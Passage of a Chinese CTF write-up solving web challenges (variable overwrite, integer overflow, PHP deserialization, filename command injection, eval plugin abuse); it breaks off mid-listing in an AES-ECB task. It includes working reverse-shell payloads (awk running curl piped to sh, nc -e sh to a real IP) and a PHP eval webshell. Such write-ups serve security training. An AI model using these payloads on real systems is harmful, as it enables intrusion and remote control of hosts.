<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668919682466-05dadb10-3e0b-45f9-96cf-8a5dcb5255de.png#averageHue=%23f5f3f2&clientId=ubb9ab657-d2cd-4&from=paste&height=122&id=u72240a33&name=image.png&originHeight=153&originWidth=921&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16438&status=done&style=none&taskId=u50513f0b-2b48-4554-81b2-0cbd3450225&title=&width=736.8" alt="image.png"><br>很好理解，第一个args和第二个*分别控制命令和OPTION<br>这边我就直接放payload了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668919702549-d673e0a9-a031-49cb-88a5-5602941b8962.png#averageHue=%23a4a4a4&clientId=ubb9ab657-d2cd-4&from=paste&height=647&id=uc2f09b41&name=image.png&originHeight=809&originWidth=1041&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40047&status=done&style=none&taskId=uf8769a53-c93b-4045-8a9c-e7f29483729&title=&width=832.8" alt="image.png"><br>本来是应该用<code>cmd=ls,param=-l</code>这样的，但是这就是个逃逸了，由于cmd限制3个字符，我们只好吧<code>/tmp/</code>放到后面去了，这似乎是一个非预期</p>
<p><strong>预期:</strong><br><code>cmd=awk&amp;param=&#123;system(&quot;curl [https://your-shell.com/43.140.251.169:6666|sh&quot;)&#125;](https://your-shell.com/43.140.251.169:6666|sh&quot;)&#125;)</code><br>这边是利用awk做一个反弹shell，关于awk指令，之后会来一篇文章研究一下<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668920199132-6664d9c9-35a6-4e28-ba38-95f425e2326e.png#averageHue=%23252321&clientId=ubb9ab657-d2cd-4&from=paste&height=106&id=ude040ef9&name=image.png&originHeight=132&originWidth=680&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10816&status=done&style=none&taskId=uf2bb780f-f82d-4e6b-a4f6-5149b4fb9a1&title=&width=544" alt="image.png"></p>
<h2 id="遍地飘零"><a href="#遍地飘零" class="headerlink" title="遍地飘零"></a>遍地飘零</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$zeros=<span class="string">&quot;000000000000000000000000000000&quot;</span>;</span><br><span class="line"></span><br><span class="line">foreach($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($flag==<span class="string">&quot;000000000000000000000000000000&quot;</span>)&#123;</span><br><span class="line">    echo <span class="string">&quot;好多零&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">&quot;没有零，仔细看看输入有什么问题吧&quot;</span>;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>变量覆盖<br><code>?_GET=flag</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668922033397-45a93085-51a1-414b-a08f-a9af4ac9785d.png#averageHue=%23f2f0ee&clientId=ubb9ab657-d2cd-4&from=paste&height=43&id=ufdef4af2&name=image.png&originHeight=54&originWidth=1075&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7947&status=done&style=none&taskId=u3408cdeb-4d44-46ba-a3bd-8831053a537&title=&width=860" alt="image.png"></p>
<h2 id="茶歇区"><a href="#茶歇区" class="headerlink" title="茶歇区"></a>茶歇区</h2><p>考点：PHP整形溢出<br>这一题一度差点成为绝杀，只是整形溢出这个概念我们不经常接触，上面的无一幸免一个道理：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668924565069-9b03ca77-af84-4cda-9889-71b7bd06448e.png#averageHue=%23dabf9b&clientId=ubb9ab657-d2cd-4&from=paste&height=219&id=uacc3744b&name=image.png&originHeight=274&originWidth=1303&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32009&status=done&style=none&taskId=u033643c2-d88b-469f-a5d4-6ee15024165&title=&width=1042.4" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668924572599-9b1a7963-a3be-4e12-b851-4fd851267d44.png#averageHue=%23fdfdfd&clientId=ubb9ab657-d2cd-4&from=paste&height=37&id=ue9acef6c&name=image.png&originHeight=46&originWidth=1087&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1586&status=done&style=none&taskId=ud1025a09-88cc-4b2d-83f3-f7c8f6296cb&title=&width=869.6" alt="image.png"><br>注意这里有个10，也就是我们买多少个，他要乘以10，所以留个心眼<br>这边直接就是整形溢出，怎么理解呢，你可以把整型数的范围想成一个圆环，我们只需要达到他的上线，在这个闭环里达到需要的范围即可：<br><code>a=10000&amp;b=0&amp;c=0&amp;d=0&amp;e=922337203685477580&amp;submit=%E5%8D%B7%E4%BA%86%E5%B0%B1%E8%B7%91%EF%BC%81</code><br>输入两次即可：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668924644852-de75e9cf-604f-40da-a573-7ffe367c07b8.png#averageHue=%23f6f5f5&clientId=ubb9ab657-d2cd-4&from=paste&height=93&id=u7d4fb291&name=image.png&originHeight=116&originWidth=629&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11900&status=done&style=none&taskId=u06612e0e-aace-467d-ab26-05ef6dde928&title=&width=503.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668924648546-cf98e08d-a65d-4cc5-ab60-e328a80e65b6.png#averageHue=%23f4eeee&clientId=ubb9ab657-d2cd-4&from=paste&height=72&id=u261c83ec&name=image.png&originHeight=90&originWidth=450&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13146&status=done&style=none&taskId=ua9778eba-8617-4460-8ed1-8473f82ab70&title=&width=360" alt="image.png"></p>
<h2 id="小舔田？"><a href="#小舔田？" class="headerlink" title="小舔田？"></a>小舔田？</h2><p>简单的反序列化POP</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Moon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;月亮&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我是&quot;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&quot;快来赏我&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ion_Fan_Princess</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&quot;牛夫人&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;nickname==<span class="string">&quot;小甜甜&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家&quot;</span>.<span class="variable language_">$this</span>-&gt;nickname.<span class="string">&quot;。\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">call</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\t\t\t\t\t\t\t\t\t\t----&quot;</span>.<span class="variable language_">$this</span>-&gt;nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Ion_Fan_Princess</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一开始以为是什么，以为是绕过wakeup，但是看了眼PHP版本，7.3不适用，再看一眼，好像wakeup不是我们要绕过的，是必经之路，这里就直接放pop了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Moon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;月亮&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="keyword">new</span> <span class="title class_">Ion_Fan_Princess</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ion_Fan_Princess</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="string">&quot;小甜甜&quot;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Moon</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>Easy</p>
<h2 id="LSB探姬"><a href="#LSB探姬" class="headerlink" title="LSB探姬"></a>LSB探姬</h2><p>我发现这次题目有一半都是探姬出的，而且出的题都很新奇<br>有源码，审一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># File       : app.py</span></span><br><span class="line"><span class="string"># Time       ：2022/10/20 15:16</span></span><br><span class="line"><span class="string"># Author     ：g4_simon</span></span><br><span class="line"><span class="string"># version    ：python 3.9.7</span></span><br><span class="line"><span class="string"># Description：TSTEG-WEB</span></span><br><span class="line"><span class="string"># flag is in /app/flag.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#初始化全局变量</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">            f.save(<span class="string">&#x27;upload/&#x27;</span>+f.filename)</span><br><span class="line">            cmd=<span class="string">&quot;python3 tsteg.py upload/&quot;</span>+f.filename</span><br><span class="line">            result=os.popen(cmd).read()</span><br><span class="line">            data=&#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span>,<span class="string">&quot;cmd&quot;</span>:cmd,<span class="string">&quot;result&quot;</span>:result,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;file uploaded!&quot;</span>&#125;</span><br><span class="line">            <span class="keyword">return</span> jsonify(data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            data=&#123;<span class="string">&quot;code&quot;</span>:<span class="number">1</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;file upload error!&quot;</span>&#125;</span><br><span class="line">            <span class="keyword">return</span> jsonify(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_source</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;source.html&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>根据源码的意思是上传一个文件，之后用<code>tsteg.py</code>对其继续处理，然后把结果返还给我们<br>注意这里<code>cmd=&quot;python3 tsteg.py upload/&quot;+f.filename</code><br>这里是不是把文件名也拼进去了，那也就是说文件名是个RCE注入点，上传个文件抓包测试一下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668926111908-de67093e-5730-4a47-ad4c-3b83f08d2e25.png#averageHue=%23f7f7f7&clientId=uef06f527-b178-4&from=paste&height=307&id=uf61cc730&name=image.png&originHeight=384&originWidth=1190&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49880&status=done&style=none&taskId=ub4b545c7-f547-4154-9c42-1b53ae420df&title=&width=952" alt="image.png"><br>都看得到flag.py了，读就好了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668926136839-00463344-8034-4700-bbde-939186a2637f.png#averageHue=%23f4f4f4&clientId=uef06f527-b178-4&from=paste&height=185&id=u9dd3e495&name=image.png&originHeight=231&originWidth=1181&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41142&status=done&style=none&taskId=u53dd828c-30f1-4883-bd4c-c16e5eb3456&title=&width=944.8" alt="image.png"><br>很新奇，不戳</p>
<h2 id="Is-Not-Obfuscate"><a href="#Is-Not-Obfuscate" class="headerlink" title="Is_Not_Obfuscate"></a>Is_Not_Obfuscate</h2><p>都说是纸老虎，但我怎么觉得不会呢，说明我才是那只纸老虎<br>首先在主页的源码发现了下面话语：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668928095176-39f41df1-cd9f-4b94-88a6-2924aa018916.png#averageHue=%23fdfdfc&clientId=u17ab05ca-0456-4&from=paste&height=86&id=uc5cdf08b&name=image.png&originHeight=108&originWidth=718&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7614&status=done&style=none&taskId=u8747641d-3dc1-43d4-97e6-81fb3fe3780&title=&width=574.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668928098371-f8656ae9-ef9e-4a44-9710-23a269f3bbe3.png#averageHue=%23fcfcfc&clientId=u17ab05ca-0456-4&from=paste&height=64&id=u7a9fec16&name=image.png&originHeight=80&originWidth=623&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4057&status=done&style=none&taskId=uc6ea76d2-17f6-4ee4-af2f-bef280cc9c8&title=&width=498.4" alt="image.png"><br>然后再robots.txt中找到了如下内容：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668928116545-f6600df8-3967-4b48-8c81-9dcb8e01c995.png#averageHue=%23f2f2f2&clientId=u17ab05ca-0456-4&from=paste&height=68&id=u06126f89&name=image.png&originHeight=85&originWidth=383&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2694&status=done&style=none&taskId=u121b2959-de2d-40ee-9389-a61137147df&title=&width=306.4" alt="image.png"><br>我们将flag的值改为1之后会发现出来了一串加密后的源码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668928133585-8ccb7bbb-3bfc-4408-a499-5b9058c6ce30.png#averageHue=%23e2f9f9&clientId=u17ab05ca-0456-4&from=paste&height=70&id=u9c9ceb2e&name=image.png&originHeight=87&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28285&status=done&style=none&taskId=u163216e1-577a-4149-a0bd-3b7722b6857&title=&width=1536" alt="image.png"><br>根据上面页面源码中的提示传入<code>action=test&amp;input=&#123;code&#125;</code>，code就是那一串加密后的源码，code记得url编码一下，因为里面有一些特殊字符，得到了以下结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;lib.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&#x27;./plugins/&#x27;</span>))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;./plugins/&#x27;</span>, <span class="number">0777</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Test it and delete it ！！！</span></span><br><span class="line"><span class="comment">//测试执行加密后的插件代码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Anything is good?Please test it.&#x27;</span>;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;./plugins/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;pull&#x27;</span>:</span><br><span class="line">            <span class="variable">$output</span> = @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>])));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;pull success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;push&#x27;</span>:</span><br><span class="line">            <span class="variable">$input</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>].<span class="string">&#x27;youyou&#x27;</span>), <span class="title function_ invoke__">encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>]));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;push success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>简单的审一下发现就是一个写入，一个读取执行<br>其中md5的salt已经给出了，就是<code>youyou</code>（小黑子？），接下来就很好写了：<br><code>?action=push&amp;output=?&gt;&lt;?php eval($_GET[1]);?&gt;</code><br><code>?action=pull&amp;input=ce42bc7f77e2ae9747e1a46991f32786&amp;1=system(&#39;nc 43.140.251.169 7777 -e sh&#39;);</code><br>这边不能用POST,不知道为啥，可能环境没开吧<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668928229677-a6044543-4951-4a55-a4fc-1ef57d4a5665.png#averageHue=%23252424&clientId=u17ab05ca-0456-4&from=paste&height=110&id=ud403090f&name=image.png&originHeight=137&originWidth=656&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6156&status=done&style=none&taskId=u0c395518-3462-4c91-9a0d-bfd76e3c686&title=&width=524.8" alt="image.png"><br>反弹出来了我们的flag，别问我为什么用反弹shell，就是觉得好玩！</p>
<h2 id="龙珠NFT"><a href="#龙珠NFT" class="headerlink" title="龙珠NFT"></a>龙珠NFT</h2><p>压轴题来咯，确实配得上压轴的称号，考点有一个密码的知识<strong>AES-ECB</strong>的编码模式：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668928314796-cffbd8b1-993c-419d-bd39-fb00bc7c3c96.png#averageHue=%23eeeeee&clientId=u17ab05ca-0456-4&from=paste&height=718&id=u5ea65277&name=image.png&originHeight=898&originWidth=854&originalType=binary&ratio=1&rotation=0&showTitle=false&size=327574&status=done&style=none&taskId=u8e9abb04-d781-458b-b61b-dbe1cc7750a&title=&width=683.2" alt="image.png"><br>大概就是上述步骤，会讲明文进行分组加密，是一种对称加密</p>
<blockquote>
<p>AES作为现在最常用的对称加密方法，主要优点有:运算速度快，加密程度高，内存消耗少。加密模式有:ECB,CBC,CFB,OFB。ECB相对于其他模式，简单，支持并行计算。作为分组加密的一种AES将数据以16字节为一组，对每一组进行同样的加密。可以循环对源数据每一组进行加密，因为ECB模式各分组加密独立，不依赖于上一分组，也可以预先分组好，并行进行加密，然后拼接。</p>
<p>因为要以16字节为一组加密，所以如果源数据大小不是16字节的倍数，最后一组数据需要填充，满足16字节。有三种填充方法:</p>
<p>padding zero: 如果数据大小不是16字节的倍数，最后一组数据需要用0凑齐16字节，然后再加密，当然解密之后需要将补充的0拿掉，但是可能会有误伤。如果源数据结尾也是0，就可能会造成数据损失。</p>
<p>padding pkcs7: 如果数据大小不是16字节的倍数，最后一组数据用缺失数据大小补充完整。比如最后一分组为13字节，差3字节，那么补充3,3,3。如果数据是16字节的倍数，那么后面还是要补充一个分组，数据为16。这样在解密之后需要根据最后一个数据的大小，决定要去除尾部多少个数据。<br>————————————————<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/linfengmove/article/details/108275747">https://blog.csdn.net/linfengmove/article/details/108275747</a></p>
</blockquote>
<p>先了解一下AES-ECB加密方式，再来写题,进入靶场看看<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1668928543001-c4879f72-a4cb-4d4e-b7fe-a05ec1b722a1.png#averageHue=%23fdfdfd&clientId=u17ab05ca-0456-4&from=paste&height=130&id=ub650732c&name=image.png&originHeight=163&originWidth=1106&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7914&status=done&style=none&taskId=uc3b53d53-ce3b-4d02-b140-20eeea4d46a&title=&width=884.8" alt="image.png"><br>先要登入，然后可以查看源码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 